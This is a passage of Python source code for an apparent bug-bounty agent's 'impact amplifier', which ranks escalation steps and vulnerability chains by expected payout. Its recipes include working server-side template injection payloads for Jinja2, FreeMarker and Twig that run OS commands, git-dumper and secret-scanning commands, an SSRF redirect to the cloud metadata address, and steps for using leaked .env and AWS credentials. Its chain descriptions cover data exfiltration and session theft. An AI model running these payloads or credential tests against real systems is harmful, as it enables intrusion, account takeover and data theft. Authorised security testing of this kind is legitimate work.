                    "craft /oauth/authorize?redirect_uri=https://sub.example.com/callback → token sent to you"
                ),
                tool="oauth_flow_test",
                expected_severity="Critical",
                bounty_range="$5,000–$20,000",
                probability=0.35,
                rationale="OAuth wildcard whitelist + subdomain takeover = steal auth codes for any user",
            ),
        ],
    },

    # ── Information Disclosure ────────────────────────────────────────────────
    "info_disclosure": {
        "aliases": ["information disclosure", "sensitive data exposure", "stack trace", "debug endpoint",
                    "exposed credentials", ".env exposed", "swagger exposed", "git exposed"],
        "max_severity": "Critical",
        "hunter_note": (
            "Info disclosure severity depends entirely on what's disclosed. "
            "Stack traces = Low. API keys in .env = Critical. AWS keys in git = Critical. "
            "ALWAYS try to USE the exposed credential/secret to prove impact."
        ),
        "steps": [
            EscalationStep(
                title="If .env exposed — test every credential/key found",
                test=(
                    "Parse .env for DATABASE_URL, AWS_ACCESS_KEY_ID, SECRET_KEY, API_KEY, etc. "
                    "Test each: can you connect to DB? Does AWS key have permissions? → Critical if yes"
                ),
                tool="web_search",
                expected_severity="Critical",
                bounty_range="$5,000–$30,000",
                probability=0.75,
                rationale="Active credential in .env + proof of access = Critical at every program",
            ),
            EscalationStep(
                title="If Swagger/OpenAPI exposed — enumerate ALL endpoints for auth bypass",
                test=(
                    "Download /swagger.json or /api-docs. Import into Burp or use rest_api_fuzzing "
                    "to test every endpoint for IDOR, missing auth, mass assignment"
                ),
                tool="rest_api_fuzzing",
                expected_severity="High",
                bounty_range="$2,000–$10,000",
                probability=0.60,
                rationale="API spec exposure enables systematic testing of endpoints developers thought were hidden",
            ),
            EscalationStep(
                title="If .git exposed — dump full source code and search for hardcoded secrets",
                tool="git_dump",
                test=(
                    "git-dumper https://target.com/.git ./dumped-repo "
                    "Then: trufflehog git file://./dumped-repo to find secrets in history"
                ),
                expected_severity="Critical",
                bounty_range="$3,000–$15,000",
                probability=0.70,
                rationale="Source code + git history = all hardcoded secrets including rotated ones",
            ),
            EscalationStep(
                title="Debug/admin endpoints — test for authenticated actions without auth",
                test=(
                    "Endpoints like /debug, /admin/console, /actuator, /metrics, /phpinfo.php "
                    "Try accessing without cookies. Try common admin paths from the debug info."
                ),
                tool="http_request",
                expected_severity="Critical",
                bounty_range="$3,000–$15,000",
                probability=0.40,
                rationale="Unauthenticated debug endpoints often expose internal state and admin functions",
            ),
        ],
    },

    # ── SSTI ─────────────────────────────────────────────────────────────────
    "ssti": {
        "aliases": ["ssti", "server-side template injection", "template injection"],
        "max_severity": "Critical",
        "hunter_note": (
            "SSTI is almost always Critical because it leads to RCE. "
            "Identify the template engine first (Jinja2, Twig, Freemarker, Velocity, Pebble). "
            "Then use the engine-specific RCE gadget — DO NOT settle for math eval proof alone."
        ),
        "steps": [
            EscalationStep(
                title="Identify template engine — use polyglot probe",
                test=(
                    "Inject: ${{<%[%'\"}}%\\. — each engine handles this differently. "
                    "Then try: {{7*7}} (Jinja2/Twig), ${7*7} (FreeMarker), #{7*7} (Pebble)"
                ),
                tool="http_request",
                expected_severity="Critical",
                bounty_range="$8,000–$30,000",
                probability=0.80,
                rationale="Template engine identification enables using the correct RCE gadget",
            ),
            EscalationStep(
                title="Jinja2 RCE — use __class__.__mro__ chain to call OS commands",
                test=(
                    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}} "
                    "Or: {{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()}}"
                ),
                tool="ssti",
                expected_severity="Critical",
                bounty_range="$8,000–$30,000",
                probability=0.65,
                rationale="Jinja2 RCE via Python class traversal — most common SSTI in modern apps",
            ),
            EscalationStep(
                title="FreeMarker RCE — Execute gadget for Java apps",
                test=(
                    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')} "
                    "Or: ${product.getClass().forName('java.lang.Runtime').getMethod('exec',String).invoke(...,'id')}"
                ),
                tool="http_request",
                expected_severity="Critical",
                bounty_range="$8,000–$30,000",
                probability=0.55,
                rationale="FreeMarker Execute gadget gives direct OS command execution in Java backends",
            ),
            EscalationStep(
                title="Twig (PHP) RCE — use filter chain",
                test=(
                    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}} "
                    "Or: {{['id']|filter('system')}}"
                ),
                tool="http_request",
                expected_severity="Critical",
                bounty_range="$8,000–$30,000",
                probability=0.55,
                rationale="Twig filter chain RCE works in PHP backends running older Twig versions",
            ),
        ],
    },
}


# ─────────────────────────────────────────────────────────────────────────────
# Chain Matrix — Cross-finding combinations and their outcomes
# ─────────────────────────────────────────────────────────────────────────────

_CHAIN_MATRIX: list[dict] = [
    {
        "requires": ["open_redirect", "jwt"],
        "title": "Open Redirect + JWT — Token theft via redirect",
        "combined_severity": "Critical",
        "bounty_range": "$8,000–$25,000",
        "description": (
            "Craft an OAuth authorization URL where redirect_uri points to your open redirect. "
            "The auth server follows the redirect, leaking the code/token in the URL. "
            "If JWT is not HTTP-only, it also leaks via the Referer chain."
        ),
    },
    {
        "requires": ["ssrf", "info_disclosure"],
        "title": "SSRF + Credential Exposure — Cloud Account Compromise",
        "combined_severity": "Critical",
        "bounty_range": "$10,000–$50,000",
        "description": (
            "SSRF reaches cloud metadata → extracts IAM role credentials. "
            "Combined with any exposed .env or config → cross-reference credentials "
            "to maximize access. Can pivot to full cloud account takeover."
        ),
    },
    {
        "requires": ["cors", "stored_xss"],
        "title": "CORS + Stored XSS — Silently exfiltrate all user data",
        "combined_severity": "Critical",
        "bounty_range": "$8,000–$25,000",
        "description": (
            "Stored XSS loads attacker-controlled script. Script uses CORS misconfiguration "
            "to fetch authenticated API data (profile, payment, admin data) from attacker's origin "
            "and exfiltrates it. Combines two High findings into Critical data breach."
        ),
    },
    {
        "requires": ["idor", "mass_assignment"],
        "title": "IDOR + Mass Assignment — Privilege Escalation to Admin",
        "combined_severity": "Critical",
        "bounty_range": "$5,000–$20,000",
        "description": (
            "IDOR lets you access other users' IDs. Mass assignment lets you add role fields. "
            "Combine: enumerate an admin user ID via IDOR, then use mass assignment on your "
            "own account update endpoint to copy the admin's role identifier."
        ),
    },
    {
        "requires": ["subdomain_takeover", "cors"],
        "title": "Subdomain Takeover + CORS — Full API Access from Attacker Subdomain",
        "combined_severity": "Critical",
        "bounty_range": "$8,000–$25,000",
        "description": (
            "Claim the taken-over subdomain. Host a page on it. "
            "CORS policy trusts *.example.com → your subdomain is included. "
            "Your page can now make credentialed API requests to the main app and exfiltrate all data."
        ),
    },
    {
        "requires": ["reflected_xss", "cors"],
        "title": "Reflected XSS + CORS — CSRF Token Bypass Chain",
        "combined_severity": "High",
        "bounty_range": "$3,000–$10,000",
        "description": (
            "XSS loads on victim's browser. Uses CORS to fetch the CSRF token from the API. "
            "Then uses the stolen token to perform state-changing actions (password change, "
            "data deletion, account settings modification) as the victim."
        ),
    },
    {
        "requires": ["path_traversal", "sql_injection"],
        "title": "LFI + SQLi — Read DB Config → Full Database Dump",
        "combined_severity": "Critical",
        "bounty_range": "$8,000–$30,000",
        "description": (
            "LFI reads the database config file (database.yml, wp-config.php, .env). "
            "Config contains DB hostname, username, password. "
            "Use SQLi (or direct DB connection from compromised creds) to dump the full database."
        ),
    },
    {
        "requires": ["race_condition", "business_logic"],
        "title": "Race Condition + Business Logic — Unlimited Free Access",
        "combined_severity": "Critical",
        "bounty_range": "$5,000–$20,000",
        "description": (
            "Race condition on a one-time action (coupon, free trial, upgrade). "
            "Business logic flaw means the check and the grant happen in separate transactions. "
            "20 concurrent requests all pass the check, all receive the benefit."
        ),
    },
    {
        "requires": ["http_smuggling", "cors"],
        "title": "HTTP Smuggling + CORS — Steal Any User's Session",
        "combined_severity": "Critical",
        "bounty_range": "$10,000–$40,000",
        "description": (
            "HTTP smuggling poisons the next user's request, prepending an attacker-controlled "
            "prefix that makes the backend return the user's auth headers. "
            "CORS misconfiguration means the attacker's origin can make that first smuggled request "
            "and receive the response with the victim's credentials."
        ),
    },
    {
        "requires": ["open_redirect", "ssrf"],
        "title": "Open Redirect + SSRF — Bypass SSRF Allowlist",
        "combined_severity": "Critical",
        "bounty_range": "$5,000–$20,000",
        "description": (
            "SSRF validator uses an allowlist of domains. Open redirect exists on an allowed domain. "
            "Chain: ssrf_param=https://allowed.com/redirect?to=http://169.254.169.254 "
            "The redirect from allowed.com takes the SSRF to the internal metadata endpoint."
        ),
    },
]


# ─────────────────────────────────────────────────────────────────────────────
# Core Engine
# ─────────────────────────────────────────────────────────────────────────────

class ImpactAmplifier:
    """
    Post-finding escalation engine.

    Given a confirmed finding, returns:
    - Ranked escalation steps (highest payout first)
    - Chain opportunities with other existing findings
    - Hunter advice tailored to the finding type
    """

    def __init__(self):
        # Build alias → canonical key lookup
        self._alias_map: dict[str, str] = {}
        for key, recipe in _ESCALATION_RECIPES.items():
            self._alias_map[key] = key
            for alias in recipe.get("aliases", []):
                self._alias_map[alias.lower()] = key

    def _resolve_type(self, finding_title: str, category: str = "") -> Optional[str]:
        """Map a finding title/category to a canonical recipe key."""
        text = " ".join([finding_title, category]).lower()
        # Direct match first
        for alias, key in self._alias_map.items():
            if alias in text:
                return key
        # Fuzzy keyword match
        keywords = {
            "xss": "reflected_xss", "cross-site": "reflected_xss",
            "sqli": "sql_injection", "sql": "sql_injection",
            "ssrf": "ssrf", "request forgery": "ssrf",
            "idor": "idor", "bola": "idor", "object level": "idor",
            "redirect": "open_redirect",
            "jwt": "jwt", "json web token": "jwt",
            "cors": "cors",
            "race": "race_condition", "toctou": "race_condition",
            "traversal": "path_traversal", "lfi": "path_traversal",
            "business logic": "business_logic", "price": "business_logic",
            "smuggling": "http_smuggling",
            "mass assign": "mass_assignment", "over-post": "mass_assignment",
            "takeover": "subdomain_takeover",
            "disclosure": "info_disclosure", ".env": "info_disclosure",
            "ssti": "ssti", "template injection": "ssti",
            "stored xss": "stored_xss",
        }
        for kw, recipe_key in keywords.items():
            if kw in text:
                return recipe_key
        return None

    def amplify(
        self,
        finding_title: str,
        severity: str = "medium",
        endpoint: str = "",
        evidence: str = "",
        category: str = "",
        top_n: int = 5,
    ) -> AmplificationResult:
        """
        Generate escalation steps for a confirmed finding.

        Args:
            finding_title:  Title of the confirmed finding (e.g., "Reflected XSS in search param")
            severity:       Current severity (low/medium/high/critical)
            endpoint:       The vulnerable endpoint
            evidence:       Brief evidence description
            category:       Optional finding category from FindingLifecycle
            top_n:          How many top escalation steps to return

        Returns:
            AmplificationResult with ranked steps and chain opportunities
        """
        recipe_key = self._resolve_type(finding_title, category)

        if recipe_key and recipe_key in _ESCALATION_RECIPES:
            recipe = _ESCALATION_RECIPES[recipe_key]
            steps = sorted(
                recipe["steps"],
                key=lambda s: (-s.probability, s.expected_severity != "Critical"),
            )[:top_n]
            max_sev = recipe["max_severity"]
            note = recipe["hunter_note"]
        else:
            # Generic escalation advice when type is unrecognized
            steps = [
                EscalationStep(
                    title="Prove data extraction or privilege escalation impact",
                    test=(
                        "Show a concrete data read or action that a real attacker would use. "
                        "Programs pay for proven impact, not theoretical issues."
                    ),
                    tool=None,
                    expected_severity="High",
                    bounty_range="Varies by program",
                    probability=0.50,
                    rationale="Impact proof is the single most important factor in bounty decisions",
                ),
            ]
            max_sev = "High"
            note = (
                "Focus on proving real-world impact: data access, account control, "
                "financial manipulation. The bounty follows the impact, not the category."
            )

        # Find chain opportunities with this finding type
        chains = []
        if recipe_key:
            for chain in _CHAIN_MATRIX:
                reqs = chain["requires"]
                if recipe_key in reqs:
                    other = [r for r in reqs if r != recipe_key]
                    chains.append({
                        "title": chain["title"],
                        "combined_severity": chain["combined_severity"],
                        "bounty_range": chain["bounty_range"],
                        "requires_also": other,
                        "description": chain["description"],
                    })

        return AmplificationResult(
            finding_type=recipe_key or finding_title,
            original_severity=severity,
            max_reachable_severity=max_sev,
            escalation_steps=steps,
            chain_opportunities=chains,
            hunter_note=note,
        )

    def chain_from_findings(self, findings: list[Any]) -> list[dict]:
        """
        Given a list of confirmed findings, identify all applicable chains.

        Args:
            findings: List of LifecycleFinding objects or dicts with 'title'/'category' keys

        Returns:
            List of chain dicts with title, severity, description, and matched findings
        """
        # Resolve all finding types
        confirmed_types: set[str] = set()
        for f in findings:
            title = getattr(f, "title", "") or f.get("title", "")
            category = getattr(f, "category", "") or f.get("category", "")
            rt = self._resolve_type(title, category)
            if rt:
                confirmed_types.add(rt)

        chains: list[dict] = []
        for chain in _CHAIN_MATRIX:
            reqs = set(chain["requires"])
            if reqs.issubset(confirmed_types):
                chains.append({
                    "title": chain["title"],
                    "combined_severity": chain["combined_severity"],
                    "bounty_range": chain["bounty_range"],
                    "description": chain["description"],
                    "requires": chain["requires"],
                    "status": "FULLY CHAINABLE — all prerequisites confirmed",
                })
            elif len(reqs & confirmed_types) >= 1:
                missing = reqs - confirmed_types
                chains.append({
                    "title": chain["title"],
                    "combined_severity": chain["combined_severity"],
                    "bounty_range": chain["bounty_range"],
                    "description": chain["description"],
                    "requires": chain["requires"],
                    "status": f"PARTIAL — need to also confirm: {', '.join(missing)}",
                })

        # Sort: fully chainable first, then by severity
        sev_order = {"Critical": 0, "High": 1, "Medium": 2}
        chains.sort(key=lambda c: (
            0 if "FULLY" in c["status"] else 1,
            sev_order.get(c["combined_severity"], 3),
        ))
        return chains

    def format_amplification(self, result: AmplificationResult) -> str:
        """Format amplification result as readable text for agent consumption."""
        lines = [
            f"═══ IMPACT AMPLIFICATION: {result.finding_type.upper()} ═══",
            f"Original Severity  : {result.original_severity.upper()}",
            f"Max Reachable      : {result.max_reachable_severity.upper()}",
            "",
            f"💡 Hunter Note: {result.hunter_note}",
            "",
            "─── ESCALATION STEPS (highest expected value first) ───",
        ]
        for i, step in enumerate(result.escalation_steps, 1):
            lines += [
                f"{i}. {step.title}",
                f"   Expected Severity : {step.expected_severity}",
                f"   Bounty Range      : {step.bounty_range}",
                f"   Probability       : {step.probability * 100:.0f}%",
                f"   Test              : {step.test}",
                f"   Tool              : {step.tool or '(manual HTTP test)'}",
                f"   Rationale         : {step.rationale}",
                "",
            ]
        if result.chain_opportunities:
            lines += ["─── CHAIN OPPORTUNITIES ───"]
            for ch in result.chain_opportunities:
                lines += [
                    f"🔗 {ch['title']}",
                    f"   Combined Severity : {ch['combined_severity']}",
                    f"   Bounty Range      : {ch['bounty_range']}",
                    f"   Also Needs        : {', '.join(ch.get('requires_also', []))}",
                    f"   {ch['description']}",
                    "",
                ]
        return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# Singleton
# ─────────────────────────────────────────────────────────────────────────────

_amplifier: Optional[ImpactAmplifier] = None


def get_amplifier() -> ImpactAmplifier:
    """Get (or lazily create) the global ImpactAmplifier instance."""
    global _amplifier
    if _amplifier is None:
        _amplifier = ImpactAmplifier()
    return _amplifier
